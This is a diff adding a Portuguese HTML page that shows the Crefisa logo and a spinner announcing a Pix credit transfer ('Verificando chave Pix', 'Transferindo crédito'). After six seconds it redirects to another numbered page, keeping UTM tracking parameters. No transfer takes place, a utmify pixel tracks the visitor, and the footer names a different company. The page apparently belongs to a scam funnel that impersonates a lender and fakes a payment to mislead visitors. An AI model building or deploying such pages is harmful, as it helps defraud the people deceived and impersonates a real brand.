@@ -1,0 +1,149 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+        background: #38C0E5;
+        color: white;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        grid-area: top-bar;
+    }
+    .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #38C0E5;
+            color: white;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        .main-content {
+            max-width: 100%;
+            padding: 20px;
+            border-top: solid 1px #38a0E5;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin: 0px auto !important;
+            border-radius: 0px !important;
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+    
+    </style>
+    <!-- Meta Pixel Code -->
+<script>
+  window.pixelId = "66f4c93a69e84de401d813a7";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-fast-start="" async="" defer=""></script>
+<!-- End Meta Pixel Code -->
+
+</head>
+
+<body>
+
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="images/Crefisa.png" alt="Imagem Centralizada" data-lazy-src="https://upload.wikimedia.org/wikipedia/pt/a/a3/Crefisa.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="https://upload.wikimedia.org/wikipedia/pt/a/a3/Crefisa.png" alt="Imagem Centralizada"></noscript>
+    </div>
+
+    <div style="grid-area: content; padding: 0;">
+        <div style="margin-top: 40px;" class="main-content">
+            <div id="loading-section" class="loading-section" style="display: flex;position: relative;top: -14rem;">
+                <div class="loading-content">
+                    <div class="spinner"></div>
+                    <p id="loading-text" style="font-size: 22px;">Iniciando transferência Pix</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+<script>
+    function iniciarCarregamento() {
+        const frases = [
+            "Verificando chave Pix.",
+            "Transferindo crédito",
+            "Aguarde um momento...",
+        ];
+
+        let fraseIndex = 0;
+        document.getElementById('loading-section').style.display = 'flex';
+
+        const fraseInterval = setInterval(() => {
+            document.getElementById('loading-text').innerText = frases[fraseIndex];
+            fraseIndex = (fraseIndex + 1) % frases.length; // Loop pelas frases
+        }, 1000);
+        
+        setTimeout(() => {
+            clearInterval(fraseInterval);
+            const utmParams = window.location.search; // Captura os parâmetros UTM
+            window.location.href = '../14' + utmParams; // Redireciona mantendo os parâmetros UTM
+        }, 6000);
+    }
+
+    // Iniciar o carregamento ao carregar a seção
+    iniciarCarregamento();
+</script>
+
+
+   
+
+    <div class="footer py-4" id="footerChg">
+       © 2024 Positivo Brasil. CNPJ 36.401.269/0001-27. <br>
+         Todos os direitos reservados
+    </div>
+</div>
+
+
+
+</body></html>
